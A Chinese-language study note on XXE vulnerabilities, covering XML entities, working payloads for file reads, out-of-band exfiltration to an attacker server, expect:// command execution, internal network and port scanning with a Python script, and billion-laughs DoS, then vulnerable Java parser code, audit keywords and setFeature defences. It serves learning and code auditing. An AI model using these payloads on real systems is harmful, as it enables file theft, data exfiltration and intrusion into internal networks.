# XXE漏洞


> 虽然然XXE漏洞很基础，但是很久不用掌握的也不太好，所以借此机会重新复习一下

## XML

XML全称“可扩展标记语言”（extensible markup language），XML是一种用于存储和传输数据的语言。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，...），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，...）与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。



#### XML文档结构

包括：`XML声明+DTD文档类型定义+文档元素`，例如：

```xml-dtd
 <?xml version="1.0" encoding="UTF-8"?>   //xml的声明  
 <!DOCTYPE foo [ 
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file://d:/1.txt" >
 ]>                                      //DTD部分
<x>&xxe;</x>                          //xml文档部分

```







#### DTD

XML 文档有自己的一个格式规范，这个格式规范就是DTD（document type definition）即文档类型定义，用于定义XML文档的结构，它作为xml文件的一部分位于XML声明和文档元素之间，比如：

```xml-dtd
<?xml version="1.0"?>//这一行是 XML 文档定义
<!DOCTYPE message [
<!ELEMENT message (receiver ,sender ,header ,msg)>
<!ELEMENT receiver (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT header (#PCDATA)>
<!ELEMENT msg (#PCDATA)>
```

它就定义了 XML 的根元素必须是message，根元素下面有一些子元素，所以 XML必须像下面这么写：

```xml
<message>
  <receiver>Myself</receiver>
  <sender>Someone</sender>
  <header>TheReminder</header>
  <msg>This is an amazing book</msg>
</message>
```

DTD需要在`!DOCTYPE`注释中定义根元素，而后在中括号的`[]`内使用！`ELEMENT`注释定义各元素特征。



#### 实体

如：

```xml-dtd
<?xml version = "1.0"?>
<!DOCTYPE fool [
	<!ELEMENT fool ANY>
    <!ENTITY xxe "test">
]>

```

它规定了xml文件的根元素是foo，但`ANY`说明**接受任何元素**。重点是`!ENTITY`，这就是我们要提到的**实体**，**实体本质是定义了一个变量**，变量名`xxe`，值为“test”，后面在 XML 中**通过 & 符号进行引用**，所以根据DTD我们写出下面的xml文件：

```xml
<login>
    <user>&xxe/user>
    <pass></pass>
</login>
```

因为ANY的属性，元素我们可以随意命令，但user值通过&xxe，实际值为test。

我们使用 &xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 `&xxe` 就会被 `"test" `替换。





重点来了，实体分为两种，内部实体和**外部实体**

##### 1.内部实体

上面的例子就是**内部实**体。



##### 2.外部实体

但是实体实际上可以从外部的dtd文件中引用



XML**外部实体**是一种自定义实体，**定义位于声明它们的DTD之外**，声明使用`SYSTEM`关键字，比如：

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

还有一种引用方式是引用**公用 DTD** 的方法，语法如下：

```
<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
```

这个在我们的攻击中也可以起到和 SYSTEM 一样的作用





上面已经将实体分成了两个派别（内部实体和外部外部），但从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）

##### 1.通用实体

用 `&实体名;` 引用的实体，他**在DTD 中定义，在 XML 文档中引用**

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]> 
<updateProfile>  
    <firstname>Joe</firstname>  
    <lastname>&file;</lastname>  
    ... 
</updateProfile>
```





##### 2.参数实体

(1) 使用 `% 实体名`(**这里面空格不能少**) 在 DTD 中定义，并且**只能在 DTD 中使用 `%实体名;` 引用**
(2) 只有在 DTD 文件中，参数实体的声明才能引用其他实体
(3) 和通用实体一样，参数实体也可以外部引用

```xml-dtd
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd;
```

> 参数实体在Blind XXE 中起到了至关重要的作用





## XXE简介

XML**外部实体注入漏洞**也叫作XXE（XML External Entity）漏洞，是一种常见的Web应用安全漏洞，可能导致敏感信息泄露、远程代码执行等安全问题。

当**应用程序使用XML处理器解析外部XML实体时，可能会发生XXE漏洞**。

**外部XML实体**是指**定义在XML文档外部的实体，它可以引用外部文件或资源**。如果XML处理器没有正确配置，它可能会解析这些外部实体，并将外部文件或资源的内容包含到XML文档中。







那么，前面说的**外部实体**究竟能干什么？

## XXE危害

根据有无回显可分为有回显XXE和Blind XXE

**危害：**

- 任意文件读取
  - 有回显读取本地文件（normal XXE）
  - 无回显读取本地文件（Blind OOB XXE，数据外带）

- 内网探测：如` <!ENTITY xxe SYSTEM "http://127.0.0.1:8080" >探测端口；`
  - HTTP内网主机探测
  - 内网端口探测

- 攻击内网站点
- 文件上传(使用`jar://`)
- 命令执行：`<!ENTITY xxe SYSTEM "expect://id" >执行命令；`
- DOS攻击

- .......







### 漏洞验证思路

关注可能解析xml格式数据的功能处，较容易发现的是请求包参数包含XML格式数据，不容易发现的是文件上传及数据解析功能处，通过改请求方式、请求头Content-Type等方式进行挖掘。

步骤：

#### 1.**检测XML是否会被成功解析以及是否支持DTD引用外部实体**

使用如下xml内容(主要添加了DTD即`DOCTYPE`)：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>20</age>
</user>
```

> 注意：当进行的是黑盒测试时，**未返回Error不代表就是可以解析XML**，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装







#### **2.测试是否支持解析普通实体**

修改xml内容如下，主要添加`ELEMENT`：

```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
        <!ELEMENT foo EMPTY>
        ]>
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>20</age>
</user>

```

发现可以正常解析。



#### **3.测试是否支持解析参数实体**

修改xml内容如下，主要修改ELEMENT为`ENTITY`实体：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
        <!ENTITY foo "Entity can be hacked">
        ]>
<user>
    <name>Mi1k7ea</name>
    <sex>&foo;</sex>
    <age>20</age>
</user>
```

可正常解析，且成功进行了XML实体注入



#### **4.测试是否支持解析外部实体：**

修改xml内容如下，主要修改为`SYSTEM`执行访问外部链接：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://192.168.17.111:8000/1.dtd">
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>&tea;</age>
</user>
```



需要在攻击者的服务器的Web目录放置一个1.dtd文件，内容如下，读取本地C盘中的win.ini配置文件（若在Linux下读取”file:///etc/passwd”会报错，因为这种攻击方式受到XML中禁止字符的限制）：

```xml-dtd
<!ENTITY tea SYSTEM "file:///c:/windows/win.ini">
```

运行代码，在攻击者服务器看到目标程序访问了其中的恶意DTD文件：

发现成功通过远程加载解析DTD文件读取了本地文件内容：



**外部实体还有另一种写法**，如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
        <!ENTITY % milk SYSTEM "http://192.168.17.136:8000/Mi1k7ea.dtd">
        %milk;
        ]>
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>&tea;</age>
</user>
```





### 有回显读取本地文件(Norm XXE)



Payload:

```xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///tmp/flag.txt">]>
<person><name>&xxe;</name></person>
```

![image-20240705205255954](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705205255954.png)



### 使用 netdoc 的 XXE 攻击

主要将file://换成netdoc:/

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
        <!ELEMENT data (#PCDATA)>
        <!ENTITY file SYSTEM "netdoc:/e:/passwd">
        ]>
<user>
    <name>netdoc</name>
    <sex>netdoc</sex>
    <age>&file;</age>
</user>
```





一些基本的绕过：https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/#%E7%BB%95%E8%BF%87%E5%9F%BA%E6%9C%AC-XXE-%E6%94%BB%E5%87%BB%E7%9A%84%E9%99%90%E5%88%B6





### OOB XXE

但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法------外带



想要外带就必须能发起请求，**那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候**，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)



**Java在Blind XXE的利用上**，读取文件会有些问题，在PHP中，我们可以使用 `php://filter/read=convert.base64-encode/resource=/etc/hosts` 方法将文本内容进行base64编码。但是Java中没这样的编码方法，所以**如果要读取换行的文件，一般使用FTP协议**，HTTP协议会由于存在换行等字符，请求发送失败。





1.在我们VPS创建一个`test.dtd`文件：

```xml-dtd
<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.3.214:7777?p=%file;'>">
```

2.开始web服务，以便后续步骤可以访问到这个`test.dtd`文件，比如SimpleHTTPServer

3.burp抓包修改数据包, 下面数据包一旦经受害者服务器处理，就会向我们的vps发送请求，查找我们的DTD文件

```xml-dtd
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://192.168.3.214:7777/test.dtd">
%remote;%int;%send;
]>
```

结果我们vps收到了flag.txt的文件内容，而SimpleHTTPServer也收到了对test.dtd的GET请求

![image-20240705210921413](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705210921413.png)



**整个调用过程：**

我们从 payload 中能看到 连续调用了三个参数实体 `%remote;%int;%send;`，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 `%`)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。







**思考：**

我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，**XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式**，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。



所以要想更进一步的利用我们不能将眼光局限于 file 协议，我**们必须清楚地知道在何种平台，我们能用何种协议**:

![image-20240705211110521](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211110521.png)











### 请求DNSLog

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "https://dnslog地址">
]>
<root>&file;</root>


```

![image-20240705211516466](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211516466.png)







### 执行系统命令

> 我们说的利用xxe命令执行，直接获取shell，都是在php中的xxe，PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，我们可以直接执行系统命令；这种情况少有发生，而且换到了java中，并没有直接能shell的操作

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
		<! ENTITY xxe SYSTEM "expect://id">
]>
<x>&xxe</x>

```





### 探测内网

可通过时间响应差异等情况探测内网IP，以及端口开放情况。

如果内网存在redis未授权，可以尝试进行组合攻击。



```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE ANY[    
    <!ENTITY port SYSTEM "http://127.0.0.1:80">
]> 
<x>&port;</x>

```

![image-20240705211613861](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211613861.png)

![image-20240705211632680](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211632680.png)



**HTTP内网主机探测：**

以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（以linux 为例），可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了

脚本例子如下：

```python
import requests
import base64

#Origtional XML that the server accepts
#<xml>
#    <stuff>user</stuff>
#</xml>


def build_xml(string):
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
    xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
    xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
    xml = xml + "\r\n" + """<xml>"""
    xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
    xml = xml + "\r\n" + """</xml>"""
    send_xml(xml)

def send_xml(xml):
    headers = {'Content-Type': 'application/xml'}
    x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
    print coded_string
#   print base64.b64decode(coded_string)
for i in range(1, 255):
    try:
        i = str(i)
        ip = '10.0.0.' + i
        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
        print string
        build_xml(string)
    except:
continue
```



**HTTP 内网主机端口扫描：**

找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的。

比如传入：

```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
<!ELEMENT data (#PCDATA)>  
]>
<data>4</data>
```

然后用burp进行端口遍历：

![image-20240705211945308](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211945308.png)

至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）







### 文件上传

利用Java的`jar`协议配合file协议



**jar:// 协议的格式：**

```
jar:{url}!{path}
```

**实例：**

```
jar:http://host/application.jar!/file/within/the/zip

这个 ! 后面就是其需要从中解压出的文件
```

jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等。



**jar 协议处理文件的过程：**

(1) 下载 jar/zip 文件到临时文件中
(2) 提取出我们指定的文件
(3) 删除临时文件

**那么我们怎么找到我们下载的临时文件呢？**

因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用





可以参考这位师傅的文章：https://xz.aliyun.com/t/3357



















### DoS 攻击

其原理是通过不断迭代增大变量的空间，进而导致内存崩溃。

```xml-dtd
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
```





### 其他payload

更多payload可参考：`https://github.com/payloadbox/xxe-injection-payload-list`







## 代码审计

### XML的常见接口

解析XML常见的方法有四种，即：DOM、DOM4J、JDOM 和SAX。



Java中常用以下常见接口来解析XML语言：

#### 1.XMLReader

当XMLReader使用默认的解析方法且未对xml进行过滤时，会出现xxe漏洞

```java
@PostMapping("/xmlReader/vuln")
public String xmlReaderVuln(HttpServletRequest request) {
  try {
    String body = WebUtils.getRequestBody(request);
    logger.info(body);
    XMLReader xmlReader = XMLReaderFactory.createXMLReader();
    xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
    return "xmlReader xxe vuln code";
  } catch (Exception e) {
    logger.error(e.toString());
    return EXCEPT;
  }
}
```







#### 2.SAXBuilder

SAXBuilder是一个JDOM解析器 能将路径中的XML文件解析为Document对象

当SAXBuilder使用默认的解析方法且未对xml进行过滤时，会出现xxe漏洞



需要引入依赖：

```xml
        <dependency>
            <groupId>org.jdom</groupId>
            <artifactId>jdom</artifactId>
            <version>1.1.3</version>
        </dependency>
```

```java
package com.example.xxedemo;

import org.jdom.input.SAXBuilder;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.InputSource;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;

/**
 * 编号7089
 */
@RestController
public class JDOMTest {

    @RequestMapping("/jdomdemo/vul")
    public String jdomDemo(HttpServletRequest request) throws IOException {

        //获取输入流
        InputStream in = request.getInputStream();
        String body =  convertStreamToString(in);

        try {
            SAXBuilder builder = new SAXBuilder();   //
            builder.build(new InputSource(new StringReader(body)));
            return "jdom xxe vuln code";
        } catch (Exception e) {
            return "Error......";
        }

    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```







#### 3.SAXReader

SAXReader是第三方的库，该类是无回显的



引入依赖：

```
<dependency>
    <groupId>dom4j</groupId>
    <artifactId>dom4j</artifactId>
    <version>1.6.1</version>
</dependency>
```

```java
package com.example.xxedemo;

import org.dom4j.io.SAXReader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.InputSource;

import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.StringReader;

/**
 * 编号7089
 */
@RestController
public class DOM4JTest {

    @RequestMapping("/dom4jdemo/vul")
    public String dom4jDemo(HttpServletRequest request) {
        try {
            //获取输入流
            InputStream in = request.getInputStream();
            String body =  convertStreamToString(in);

            SAXReader reader = new SAXReader();  //创建对象
            reader.read(new InputSource(new StringReader(body)));  //读取，解析
            return "DOM4J XXE......";
        } catch (Exception e) {
            return "EXCEPT ERROR!!!";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```



Poc:

```xml
?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE data [
        <!ENTITY % remote SYSTEM "http://127.0.0.1:8080/xxe.dtd">
        %remote;
        ]>
<message>
    <to>Kobe</to>
    <from>James</from>
    <text>&tmp;</text>
</message>
```







#### 4.SAXParserFactory

该类也是JDK内置的类，但他不可回显内容，可借助dnslog平台

```
package com.example.xxedemo;

import com.sun.org.apache.xml.internal.resolver.readers.SAXParserHandler;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.InputSource;

import javax.servlet.http.HttpServletRequest;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;

/**
 * 编号7089
 */
@RestController
public class SAXTest {
    @RequestMapping("/saxdemo/vul")
    public String saxDemo(HttpServletRequest request) throws IOException {

        //获取输入流
        InputStream in = request.getInputStream();
        String body =  convertStreamToString(in);
        try {
            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            SAXParserHandler handler = new SAXParserHandler();   //关键字
            //解析xml
            parser.parse(new InputSource(new StringReader(body)), handler);

            return "Sax xxe vuln code";
        } catch (Exception e) {
            return "Error......";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```



Poc:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
        <!ENTITY % remote SYSTEM "http://127.0.0.1:8080/bypass.dtd">
        %remote;
        ]>
<message>
    <to>Kobe</to>
    <from>James</from>
    <text>&internal;</text>
</message>
```

```xml
<!ENTITY % file SYSTEM "file:///e://1.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8080/?%file;'>">
%all;
```







#### 5.Digester

其触发的xxe漏洞是没有回显的，我们一般需要通过Blind XXE的方法来利用



引入依赖：

```xml
<dependency>
    <groupId>commons-digester</groupId>
    <artifactId>commons-digester</artifactId>
    <version>2.1</version>
</dependency>
```

```java
package com.example.xxedemo;

import org.apache.commons.digester.Digester;
import org.dom4j.io.SAXReader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.InputSource;

import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.StringReader;

@RestController
public class DigesterTest {

    @RequestMapping("/digesterdemo/vul")
    public String digesterDemo(HttpServletRequest request) {
        try {
            //获取输入流
            InputStream in = request.getInputStream();
            String body =  convertStreamToString(in);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));
            return "Digester XXE......";
        } catch (Exception e) {
            return "EXCEPT ERROR!!!";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```







#### 6.DocumentBuiderFactory

这是JDK自带的类，以此产生的XXE是存在回显的



DocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。



```java
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import java.io.File;
public class dbuilder {
    public static void main(String[] args) {
        File file = new File("test.xml");
        //DocumentBuilderFactory是一个抽象工厂类，不能直接实例化
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        try{
            //获取Dom模式解析对象
            DocumentBuilder builder = factory.newDocumentBuilder();
            //读取xml文件
            Document document = builder.parse(file);
            //获取名为 message 节点
            NodeList nodeList = document.getElementsByTagName("message");
            Element e = (Element) nodeList.item(0);
            //根据节点名称获取值
            System.out.println("To: " + e.getElementsByTagName("to").item(0).getFirstChild().getNodeValue());
            System.out.println("From: " + e.getElementsByTagName("from").item(0).getFirstChild().getNodeValue());
            System.out.println("Text: " + e.getElementsByTagName("text").item(0).getFirstChild().getNodeValue());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```





测试poc：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo SYSTEM "http://127.0.0.1:8080/xxe.dtd" >
<message>
    <to>Kobe</to>
    <from>James</from>
    <text>&tmp;</text>
</message>
```

外部DTD:

```xml
<!ENTITY tmp SYSTEM "file:///e://1.txt">

```



#### 7.SAXTransformer

```java
import javax.xml.transform.sax.SAXTransformerFactory;
import javax.xml.transform.stream.StreamSource;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

public class SAXTransformer {
    public static void main(String[] args) throws Exception {
        File file = new File("oob.xml");
        InputStream inputStream = new FileInputStream(file);
        SAXTransformerFactory factory = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
        StreamSource source = new StreamSource(inputStream);
        factory.newTransformerHandler(source);
    }
}
```





#### 8.Schema

```xml
import javax.xml.XMLConstants;
import javax.xml.transform.Source;
import javax.xml.transform.stream.StreamSource;
import javax.xml.validation.SchemaFactory;
import java.io.File;

public class Schema {
    public static void main(String[] args) throws Exception{
        File file = new File("oob.xml");
        SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
        Source source = new StreamSource(file);
        schemaFactory.newSchema(source);
```





#### 9.Transformer

```
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMResult;
import javax.xml.transform.stream.StreamSource;
import java.io.File;

public class Transformer {
    public static void main(String[] args) throws Exception {
        File file = new File("oob.xml");
        TransformerFactory factory = TransformerFactory.newInstance();
        StreamSource source = new StreamSource(file);
        factory.newTransformer().transform(source, new DOMResult());
    }
}
```

#### 10.Unmarshaller

```java
import javax.xml.bind.JAXBContext;
import javax.xml.bind.Unmarshaller;
import java.io.File;

public class Unmarsh {
    public static void main(String[] args) throws Exception {
        File file = new File("oob.xml");
        Class tclass = Unmarsh.class;
        JAXBContext context = JAXBContext.newInstance(tclass);
        Unmarshaller unmarshaller = context.createUnmarshaller();
        Object obj = unmarshaller.unmarshal(file);
        tclass.cast(obj);
    }
}
```





#### 11.ValidatorSample

```
import javax.xml.transform.Source;
import javax.xml.validation.Schema;
import javax.xml.validation.SchemaFactory;
import javax.xml.validation.Validator;
import java.io.File;

public class ValidatorSample {
    public static void main(String[] args) throws Exception{
        File file = new File("oob.xml");
        SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
        Schema schema = factory.newSchema();
        Validator validator = schema.newValidator();
        validator.validate((Source) file);
    }
}
```



### 挖掘技巧

挖掘XXE漏洞的关键是找到：

**代码是否涉及xml解析(找这些关键字)——>xml输入是否是外部可控——>是否禁用外部实体（DTD）**

若三个条件满足则存在漏洞。







### 审计关键字

> 可以只搜索包的点的最后一部分，或者pom.xml中看到引入的第三方库
>
> 比较简单，看到解析XML的代码，并且没有setFeature禁用外部实体，那大可能就会有该漏

和其他漏洞一样，只不过审计时候搜索的关键字不同，搜索**常见关键字**以快速对代码进行定位：

```bash
DocumentHelper
DocumentHelper.parseText
java.beans.XMLDecoder
javax.xml.bind.Unmarshaller   //使用默认的解析方法不会存在XXE问题，这也是唯一一个使用默认的解析方法不会存在XXE的一个库。
Unmarshaller
javax.xml.parsers.DocumentBuilder    // DoM解析
javax.xml.parsers.DocumentBuilderFactory
DocumentBuilder
DocumentBuilderFactory
javax.xml.parsers.SAXParser    //SAX解析
javax.xml.stream.XMLInputFactory
javax.xml.stream.XMLStreamReader
XMLStreamReader
javax.xml.transform.sax.SAXSource
javax.xml.transform.sax.SAXSource 
javax.xml.transform.sax.SAXTransformerFactory    //SAXTransformerFactory
SAXTransformerFactory
javax.xml.transform.TransformerFactory
TransformerFactory
javax.xml.validation.SchemaFactory    //SchemaFactory
SchemaFactory
javax.xml.validation.Validator
javax.xml.xpath.XPathExpression
XPathExpression
newSAXParser
oracle.xml.parser.v2.XMLParser
org.apache.commons.digester.Digester      //Digester解析
org.apache.commons.digester3.Digester
Digester
org.dom4j.DocumentHelper
org.dom4j.io.SAXReader   //dom4j解析
SAXReader
org.jdom.input.SAXBuilder  //JDOM解析
org.jdom.output.XMLOutputter
org.jdom2.input.SAXBuilder
SAXBuilder
org.xml.sax.helpers.XMLReaderFactory
XMLReaderFactory
org.xml.sax.XMLReader
XMLReader
createXMLReader
org.xml.sax.SAXParseExceptionpublicId
SAXParserFactory     //SAXParserFactory
SAXSource


```



### 例子

这里以Hello-Java-Sec为简单例子说明

搜索关键字发现使用了`DocumentBuilderFactory.newInstance()`

![image-20240705215111345](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215111345.png)



进入代码查看xml是否可控



可以发现：程序首先通过`DocumentBuilderFactory.newInstance()`来获取一个实例，然后通过`DocumentBuilder::parse`来解析

![image-20240705215234206](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215234206.png)



继续跟进，发现直接通过`getValueByTagName`函数获取了person节点的内容并在进行对比数据后将其输出到页面上。也就是说可以通过控制person的值来达到回显xxe的目的。

构造payload：

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///d://index.txt">
]>
<person><name>&f;</name><password>admin888</password></person>

```

![image-20240705215535839](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705215535839.png)

成功读取文件





## 漏洞防御

- 使用XML解析器时需要设置其属性，禁止使用外部实体

  - 禁用外部实体之后能解决绝大部分的安全问题

    - ```java
      //实例化解析类之后常用的禁用外部实体的方法
      obj.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
      obj.setFeature("http://xml.org/sax/features/external-general-entities",false);
      obj.setFeature("http://xml.org/sax/features/external-parameter-entities",false);
      
      // 注意，不同解析库的修复方案不同
      ```

  - 但是不同库的禁止方法略微有不同，具体可以参考这篇文章：[Java中不同库的修复方法](https://blog.spoock.com/2018/10/23/java-xxe)


- 手动黑名单过滤
- 许多第三方组件会爆出xxe漏洞，应避免引入这些组件





## 参考文章

